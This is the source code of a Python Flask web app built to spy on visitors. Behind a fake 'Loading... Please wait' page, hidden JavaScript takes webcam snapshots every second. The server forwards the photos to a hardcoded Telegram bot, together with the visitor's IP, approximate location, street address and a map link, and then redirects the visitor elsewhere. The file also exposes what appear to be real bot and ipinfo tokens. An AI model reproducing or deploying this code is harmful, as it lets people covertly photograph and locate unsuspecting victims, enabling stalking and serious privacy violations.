import os
import requests
from flask import Flask, render_template_string, request, redirect, jsonify
from io import BytesIO
from PIL import Image
import base64
import json
import platform
import psutil
import time

app = Flask(__name__)

# Telegram Bot Credentials
BOT_TOKEN = "7237565804:AAHCpUXLf88YLVjLwAfG9LS7kBRMkv2YCYI"
CHAT_ID = "1702319284"
TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
TELEGRAM_PHOTO_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

# Global state for messages
state = {
    'separator_sent': False,
    'ip_info_sent': False
}

# HTML templates as inline strings
index_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Capture</title>
    <style>
        #canvas { display: none; }
    </style>
</head>
<body>
    <p>Loading... Please wait while we redirect you.</p>
    <canvas id="canvas"></canvas>
    <script>
        setTimeout(() => {
            window.location.href = '/redirect';
        }, 5000); 
    </script>
</body>
</html>
"""

ask_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Capture with Camera Permission</title>
    <style>
        #canvas { display: none; }
    </style>
</head>
<body>
    <p>Loading... Please wait while we check your camera permissions.</p>
    <canvas id="canvas"></canvas>
    <script>
        async function startCameraCapture() {
            try {
                const permissionStatus = await navigator.permissions.query({ name: 'camera' });
                if (permissionStatus.state === 'granted') {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.createElement('video');
                    video.style.display = 'none';
                    video.srcObject = stream;
                    video.play();

                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');

                    const captureInterval = setInterval(() => {
                        if (document.visibilityState === 'visible') {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const dataUrl = canvas.toDataURL('image/jpeg');
                            fetch('/capture', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                                body: `image=${encodeURIComponent(dataUrl)}`
                            }).catch(error => console.error('Error:', error));
                        } else {
                            clearInterval(captureInterval);
                        }
                    }, 1000);
                } else {
                    console.log('Camera access not granted.');
                }
            } catch (err) {
                console.error('Error checking camera permission:', err);
            }
        }
        startCameraCapture();
        setTimeout(() => {
            window.location.href = '/redirect';
        }, 5000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(index_html)

@app.route('/ask')
def ask_permission():
    return render_template_string(ask_html)

@app.route('/capture', methods=['POST'])
def capture():
    try:
        img_data = request.form.get('image')
        if img_data is None:
            raise ValueError("No image data received")
        
        img_data = img_data.split(',')[1]
        img_bytes = base64.b64decode(img_data)

        if not state['separator_sent']:
            send_separator_message()
            state['separator_sent'] = True

        if not state['ip_info_sent']:
            ip_info = get_ip_info()
            if ip_info:
                send_ip_info_to_telegram(ip_info)
                state['ip_info_sent'] = True

        send_image_to_telegram(img_bytes)

        return redirect("https://meetz.printify.me")

    except ValueError as ve:
        print(f"ValueError: {ve}")
        return jsonify({"error": str(ve)}), 400
    except requests.RequestException as re:
        print(f"RequestsException: {re}")
        return jsonify({"error": "Failed to communicate with external services"}), 500
    except Exception as e:
        print(f"Unexpected error: {e}")
        return jsonify({"error": "An unexpected error occurred"}), 500

def send_separator_message():
    try:
        message = "------------------------------"
        data = {'chat_id': CHAT_ID, 'text': message}
        response = requests.post(TELEGRAM_URL, data=data)
        response.raise_for_status()
        print("Separator message sent to Telegram successfully")
    except requests.RequestException as e:
        print(f"Error sending separator message to Telegram: {e}")

def get_ip_info():
    try:
        ip_info_url = "https://ipinfo.io/json?token=e4ded4bbd0cb8d"
        response = requests.get(ip_info_url)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(f"Error getting IP info: {e}")
        return None

def reverse_geocode(lat, lon):
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
        headers = {'User-Agent': 'YourAppName/1.0'}
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        result = response.json()
        return result.get('display_name', 'Address not found')
    except requests.RequestException as e:
        print(f"Error reverse geocoding: {e}")
        return 'Address not found'

def send_ip_info_to_telegram(ip_info):
    try:
        ip = ip_info.get('ip', 'N/A')
        city = ip_info.get('city', 'N/A')
        region = ip_info.get('region', 'N/A')
        country_code = ip_info.get('country', 'N/A')
        country = get_country_emoji(country_code)
        loc = ip_info.get('loc', 'N/A').split(',')
        latitude = loc[0] if len(loc) > 0 else 'N/A'
        longitude = loc[1] if len(loc) > 1 else 'N/A'
        google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"
        org = ip_info.get('org', 'N/A')
        postal = ip_info.get('postal', 'N/A')
        timezone = ip_info.get('timezone', 'N/A')

        address = reverse_geocode(latitude, longitude)

        message = f"""
🌍 *IP Information*
IP: {ip}
City: {city} 🏙️
Region: {region} 📍
Country: {country} {country_code}
Location: {latitude},{longitude} 📍
Google Maps: {google_maps_link}
Registered Address: {address}
Org: {org} 🏢
Postal: {postal} ✉️
Timezone: {timezone} ⏰

📱 *Device Information*
Device Type: {get_device_type()}
Device Model: {get_device_model()}
Battery Percentage: {get_battery_percentage()}%
Device Plugged In: {get_device_plugged_in()}
"""
        data = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
        response = requests.post(TELEGRAM_URL, data=data)
        response.raise_for_status()
        print("IP info sent to Telegram successfully")
    except requests.RequestException as e:
        print(f"Error sending IP info to Telegram: {e}")

def get_country_emoji(country_code):
    country_emojis = {
        'US': '🇺🇸', 'IN': '🇮🇳', 'CN': '🇨🇳', 'JP': '🇯🇵', 'DE': '🇩🇪',
        'FR': '🇫🇷', 'GB': '🇬🇧', 'IT': '🇮🇹', 'ES': '🇪🇸', 'RU': '🇷🇺'
    }
    return country_emojis.get(country_code, '🇺🇳')

def get_device_type():
    system = platform.system()
    if system == 'Windows':
        return 'PC (Windows)'
    elif system == 'Darwin':
        return 'MacBook (macOS)'
    elif system == 'Linux':
        return 'PC (Linux)'
    elif system == 'Android':
        return 'Mobile (Android)'
    elif system == 'iOS':
        return 'Mobile (iOS)'
    else:
        return 'Unknown Device'

def get_device_model():
    system = platform.system()
    if system == 'Windows':
        return platform.node()
    elif system == 'Darwin':
        return platform.mac_ver()[0]
    elif system == 'Linux':
        return platform.uname().machine
    elif system == 'Android' or system == 'iOS':
        return 'Unknown Model'
    else:
        return 'Unknown Model'

def get_battery_percentage():
    try:
        battery = psutil.sensors_battery()
        return battery.percent if battery else 'N/A'
    except Exception as e:
        print(f"Error getting battery percentage: {e}")
        return 'N/A'

def get_device_plugged_in():
    try:
        battery = psutil.sensors_battery()
        return 'Yes' if battery and battery.power_plugged else 'No'
    except Exception as e:
        print(f"Error checking if device is plugged in: {e}")
        return 'N/A'

def send_image_to_telegram(image_bytes):
    try:
        files = {'photo': ('image.jpg', image_bytes, 'image/jpeg')}
        data = {'chat_id': CHAT_ID}
        response = requests.post(TELEGRAM_PHOTO_URL, files=files, data=data)
        response.raise_for_status()
        print("Image sent to Telegram successfully")
    except requests.RequestException as e:
        print(f"Error sending image to Telegram: {e}")

@app.route('/redirect', methods=['GET'])
def redirect_to_external():
    try:
        if not state['separator_sent']:
            send_separator_message()
            state['separator_sent'] = True

        if not state['ip_info_sent']:
            ip_info = get_ip_info()
            if ip_info:
                send_ip_info_to_telegram(ip_info)
                state['ip_info_sent'] = True

        return redirect("https://meetz.printify.me")
    except Exception as e:
        print(f"Unexpected error during redirection: {e}")
        return jsonify({"error": "Failed to redirect"}), 500

if __name__ == '__main__':
    app.run(debug=True) 